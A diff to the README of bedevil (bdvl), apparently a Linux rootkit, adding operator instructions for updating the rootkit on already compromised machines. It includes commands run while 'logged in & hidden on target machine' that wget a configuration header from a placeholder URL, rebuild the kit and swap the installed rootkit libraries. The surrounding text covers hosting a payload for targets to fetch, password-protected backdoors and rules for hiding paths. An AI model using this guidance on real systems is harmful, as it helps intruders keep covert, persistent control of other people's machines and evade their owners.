@@ -1,3 +1,4 @@
+
 # bedevil (bdvl)
 
 <img src=https://i.imgur.com/PyO00vy.png alt="icon" />
@@ -27,8 +28,10 @@
  * First you'll want to edit maybe a small handful of settings in `setup.py`.
    * You can fine tune a decent amount of stuff to your liking.
  * Next, `sh etc/depinstall.sh && make`...
-   * Now in the `build/` directory there are two new files.
-   * `<PAM_UNAME>.b64` & `bdvl.so.*`
+   * Now in the `build/` directory there are three new files.
+     * `<PAM_UNAME>.b64`
+     * `bdvl.so.*`
+     * `<PAM_UNAME>.h` ([Updating existing installations](#updating-existing-installations))
  * When it comes to the actual installation, you have three choices.
    * Host the result (_for example_) `build/changeme.b64` file somewhere accessible from the target box & point the first variable in `etc/auto.sh` to wherever `changeme.b64` may be.
    * On the box, when running `etc/auto.sh` supply it a path as an argument to this file wherever it is.
@@ -51,7 +54,59 @@
 
 <img src=https://i.imgur.com/pqpJHTy.png alt=first-backdoor-login />
 
-<hr> 
+<hr>
+
+### Updating existing installations
+
+ * Once compiled & ready to go, the header file for your configuration will be in the `build/` directory.
+
+#### Updates to code-base only
+
+ * In most cases, there will only be changes to the code-base & not the contents `bedevil.h` itself.
+   * In this case, all you need to do is replace `newinc/bedevil.h` with **your** `<PAM_UNAME>.h`.
+   * Then `make` & replace the existing rootkit.so's with the newly compiled ones.
+ * **Example** (*logged in & hidden on target machine inside cloned/updated bdvl*):
+```
+wget https://url.to/mybedevil.h -O newinc/bedevil.h &&
+make && 
+mv build/*.x86_64 ~/install_dir/`./bdv soname`.x86_64 && 
+mv build/*.i686 ~/install_dir/`./bdv soname`.i686 2>/dev/null
+```
+ * Of course your target might be on a different platform or you may have access to `mybedevil.h` somehow else but the idea is fundamentally the same.
+ * Before going full steam ahead with installing a new version of bdvl, you **very much should triple-check** you won't wreck anything or accidentally leave some unhidden & pretty odd looking directory behind from the **first installation**.
+ * Do this by checking bedevil.h. More on that below.
+
+#### Updates to bedevil.h
+
+ * It could be that there have been new additions to `bedevil.h`, or maybe some things have been removed.
+ * If this is the case, have a look. See what has changed.
+   * The header is aptly commented & spaced out by `setup.py` so that you know what exactly everything is.
+   * The comments in the header are intended to be markers, making cross-referencing settings & values much easier.
+ * Really it is just a case of adding or removing stuff in the new header.
+   * Adding stuff should there be new settings or arrays to take care of.
+   * Or removing stuff... If particular settings or arrays have been removed from the kit for whatever reason.
+ * By cross-referencing the new `bedevil.h` with your `<PAM_UNAME>.h` you can determine what needs changed.
+   * Don't rush.
+   * When you see something that needs changed, **replace all** (Ctrl+H or equivalent), if it is a string, in the new header with what **you** already have for that certain setting/value.
+   * **Replacing all** is important as there may be parts of a target string within another. (for example your string could a substring in an array)
+ * If you are replacing a constant, it is accompanied by `LEN_{NAME}`.
+   * **Make sure this value & actual character length match!!**
+ * Once you're 100% definite that the new updated header matches **your own** configuration & settings close enough to the point that you will be using the same paths, magic GID etc. you are good to update your installation.
+   * It could be worth your time installing in a test environment beforehand, just to verify everything is a-ok.
+ * **Example** (*logged in & hidden on target machine inside cloned/updated bdvl*):
+```
+make &&
+mv build/*.x86_64 ~/install_dir/`./bdv soname`.x86_64 &&
+mv build/*.i686 ~/install_dir/`./bdv soname`.i686 2>/dev/null
+```
+ * Of course you might be on a different platform but the idea remains the same.
+
+##### Notes
+
+ * Automating this process sounds like it would be a good idea, but very messy.
+   * In this case I believe human intervention is the best route.
+
+<hr>
 
 ## Features & configuration information
  * Listed in the table below is a very concise overview of all of the *important* functionalities that bedevil has.
@@ -109,6 +164,8 @@
      * Paths in here will be rehidden upon GID changes.
      * If you are to unhide a path after its creation (path GID = 0), it will simply be ignored when the magic GID is being changed & files are subsequently being hidden.
      * If you would like to stop a path from being automatically rehidden upon a GID change just remove the path's line.
+   * Paths that are not tracked can be found in `NOTRACK` in `setup.py`.
+     * By default these paths are, `/proc`, `/root`, `/tmp` & rootkit paths.
 
 ### Backdoors
  * All of the backdoors available in bdvl are password protected.
